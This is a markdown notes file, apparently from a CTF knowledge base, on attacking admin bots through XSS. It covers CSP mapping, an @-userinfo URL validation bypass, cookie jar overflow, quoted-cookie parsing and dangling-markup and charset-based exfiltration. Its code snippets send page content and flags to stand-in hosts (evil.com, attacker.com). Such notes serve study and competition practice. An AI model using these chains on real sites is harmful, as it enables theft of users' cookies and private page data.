# Bot-Based XSS + Cookie Exfiltration Patterns

## Challenge Shape
- Internal service (e.g. port 7001) not externally accessible
- Bot (Selenium/Puppeteer) visits user-supplied URL + internal pages
- Flag on internal page, rendered only from loopback
- Must exfiltrate page content back to attacker

## Key Recon Steps

### 1. Map the bot behavior exactly
Read bot_runner source if accessible (Docker exec, source disclosure). Key details:
- What pages does the bot visit in what ORDER?
- Does the bot set/receive cookies at each step?
- What's the page_load_timeout and sleep duration?
- Does it use WebDriverWait for specific elements?

### 2. Map CSP per-endpoint
Different routes often have DIFFERENT CSPs:
- Queue/dashboard pages: `script-src 'nonce-...'` + `connect-src 'self'` (XSS-protected)
- API endpoints / error pages: `script-src 'unsafe-inline'` (the sink!)
- Status/info pages: `img-src http: https:` (exfil channel)

### 3. Identify the "sink" endpoint
Look for endpoints that:
- Return `text/html` content-type (Flask: `make_response(string)` without explicit mimetype)
- Have `script-src 'unsafe-inline'` CSP
- Contain user-controlled content in the response body
- Common pattern: API returning JSON as text/html due to missing `mimetype='application/json'`

## URL Validation Bypass: @-userinfo Trick

```
http://127.0.0.1:7000@evil.com/exploit.html
```
- Python `str.startswith("http://127.0.0.1:7000")` passes ✓
- Browser navigates to `evil.com` (userinfo is ignored, host is after @)
- Bot error "invalid argument" = Selenium webdriver (URL format issue)
- Works with any external host as the real destination

## Private Network Access (PNA) in Chrome

### What's blocked (HTTPS → private):
- `fetch()`, `XMLHttpRequest` to 127.0.0.1 from HTTPS page
- `<img>`, `<iframe>`, `<script src>` to private IPs from public HTTPS
- Error: `TypeError: Failed to fetch`

### What's NOT blocked:
- **Top-level navigation** (`window.location`, form submit with `target=_self`)
- **`window.open()`** to private IPs (new top-level browsing context)
- **`document.cookie`** assignment (DOM operation, not network)
- In **HTTP** (non-secure) contexts, PNA preflight may not be enforced

### Headless Chrome specifics:
- Popup blocking is OFF in headless mode
- `window.open()` always works without user gesture

## Cookie Jar Overflow Attack

When an HttpOnly cookie exists that you need to override:
1. Set 180+ dummy cookies for the same domain to evict oldest (HttpOnly) cookie
2. Then set your payload cookie — it's now the ONLY one with that name
3. All via `document.cookie = "..."` (no network request needed!)

```javascript
// Overflow the jar to evict the old HttpOnly "banner" cookie
for (let i = 0; i < 200; i++) {
  document.cookie = `z${i}=x; path=/status`;
}
// Now set our malicious banner cookie
document.cookie = "banner=<img src=http://evil.com/exfil?d=; path=/status";
// Navigate to the page that renders the cookie value
window.location = "http://127.0.0.1:7001/status";
```

Note: `document.cookie` works even with `connect-src 'none'` CSP (it's not a network request).
Navigation (`window.location`) is also NOT blocked by CSP.

## Quoted-Cookie Sandwich via Lenient Server Parsing

**Pattern:** two same-name cookies are sent around a sensitive HttpOnly cookie, and the server-side cookie parser accepts a quoted value that continues across semicolon-separated cookie pairs.

Conceptually:

```text
Cookie: banner="<img src='https://attacker.invalid/?d=; auth=SENSITIVE; banner='>"
```

If the framework/parser treats the first quote as opening one quoted cookie value and scans forward to the later matching quote, the parsed value of `banner` may absorb the intervening `auth=...` material.

This becomes useful when:

- same-origin JavaScript can create the opening/closing same-name cookies;
- cookie paths cause both attacker cookies and the HttpOnly cookie to be sent on the same request;
- the application reflects the parsed cookie value into HTML without escaping;
- an allowed navigation/image/form channel can carry the reflected bytes outward.

Do **not** assume this parser behavior from RFC theory alone. Reproduce it directly with a synthetic `Cookie:` header against the exact framework/version before building the browser chain.

A minimal validation shape:

```bash
curl -sS -H 'Cookie: banner="<img src=TEST?d=; auth=SENTINEL; banner=>"' \
  https://target.invalid/status
```

The success predicate is not "the request was accepted"; it is that the rendered/parsing output actually contains the sentinel inside the value derived from the first cookie.

Cookie ordering matters. Record:

- cookie name;
- path;
- creation order;
- HttpOnly/SameSite/Secure flags;
- exact raw `Cookie:` header emitted by the browser;
- which duplicate value the framework returns.

This is a parser-differential primitive, not a generic guarantee about duplicate cookies.

## Dangling Markup Injection via Cookies

When a cookie value is rendered with `| safe` (Jinja2) or without escaping:

```
<img src="http://attacker.com/exfil?d=
```

This unclosed tag captures everything until the next `"` in the HTML:
```html
<p><img src="http://attacker.com/exfil?d=</p>
  Some text here
  <p>FLAG{secret_value}</p>
  ...
  <footer class="site-footer">  ← first " closes the src attribute
```

The browser sends a request to `attacker.com/exfil?d=</p>%0A...FLAG{secret_value}...`

### Status page CSP must allow img-src:
- `img-src http: https:` — dangling img tag works ✓
- `default-src 'none'` without img-src — blocked ✗

## Charset-Driven Dangling-Markup Exfiltration

A legacy/non-default character encoding can change how later page bytes are interpreted after attacker-controlled markup sets or influences the document charset.

One reusable shape is:

```text
attacker-controlled reflected HTML
  -> early <meta charset=...>
  -> open image/URL attribute
  -> encoding-state escape sequence
  -> later sensitive page bytes become part of the URL
  -> browser requests attacker-controlled endpoint
```

ISO-2022-JP is especially interesting because it is stateful: escape sequences switch between character sets. In a controlled CTF page, an attacker may use a charset switch plus a later byte sequence that returns to ASCII so otherwise-special HTML bytes are consumed as URL data.

Treat this as **exact-parser/browser behavior**:

1. confirm the browser accepts the declared charset at that document position;
2. reproduce the byte stream locally with the target browser version;
3. log the final requested URL exactly;
4. verify CSP allows the chosen resource type;
5. verify any pre-existing reflected cookie/value does not win duplicate-cookie ordering;
6. do not assume the technique survives UTF-8 defaults, CSP, sanitizer rewriting, or modern browser changes.

Keep the exploit proof at the byte/URL level. The important reusable lesson is the stateful-charset parser transition, not one challenge-specific escape sequence or flag.


## DOMPurify / mXSS Claims

Do not treat a version number plus a historical mXSS payload as proof of exploitability. Sanitizer behavior depends on the exact DOMPurify version, configuration, parser/browser version, and the page CSP.

Use [dompurify-3.3.1-mxss-verification.md](dompurify-3.3.1-mxss-verification.md) for the empirical harness and current version-specific findings. If a sanitizer bypass survives but the resulting event handler/script is blocked by nonce-based CSP, the chain is still dead.

## Flask/Werkzeug Quirks

- `request.headers.get("X-Custom-Header")` is CASE-INSENSITIVE
  - `x-desk-action: view` works same as `X-Desk-Action: view`
- `make_response(string)` without mimetype defaults to `text/html`
- Cookies are host-scoped, NOT port-scoped (shared across ports on same host)
- `secrets.token_urlsafe(18)` = 24 chars, cryptographically secure (can't predict nonces)

## Multi-Port Cookie Sharing

Browsers share cookies across ports on the same host:
- Cookie set on `127.0.0.1:7000` IS sent to `127.0.0.1:7001`
- Cookie set for `127.0.0.1` is NOT sent to `localhost` (different host)
- HttpOnly cookies can't be read/modified by JS, but JS CAN set a new cookie with same name (creating duplicates)
- Flask/Werkzeug `request.cookies.get(name)` returns FIRST occurrence in Cookie header
- Chrome cookie ordering: longer path first, then oldest first (for same path)

## Exploit Chain Template

1. Create ticket/content with JS payload on the target app
2. Find the "sink" endpoint (text/html + script-src unsafe-inline + user content)
3. Get the bot to render that endpoint as a page (needs the right headers)
4. JS executes: cookie jar overflow → set exfil cookie → navigate to flag page
5. Flag page renders with dangling markup → img request exfils flag

## Common Blockers and Solutions

| Blocker | Solution |
|---------|----------|
| URL prefix validation | @-userinfo trick |
| PNA blocks fetch to private | Top-level navigation, or get code on private origin |
| CSP connect-src 'none' | document.cookie + location (not network) |
| HttpOnly cookie can't be overwritten | Cookie jar overflow (180+ cookies evicts oldest) |
| nonce CSP blocks inline scripts | Find endpoint WITHOUT nonce (API sink) |
| Custom header required for API | Use page's own JS that already sends it (queue page) |
| DOMPurify sanitization | reproduce an exact-version/config/browser bypass; see `dompurify-3.3.1-mxss-verification.md` |

## Provenance

Quoted-cookie parsing, stateful-charset exfiltration, and exact-browser verification lessons were generalized from a June 2026 admin-bot CTF investigation. Challenge-specific hosts, ports, instance identifiers, local paths, credentials, and flag values are intentionally omitted. Historical raw notes remain recoverable from Git history.
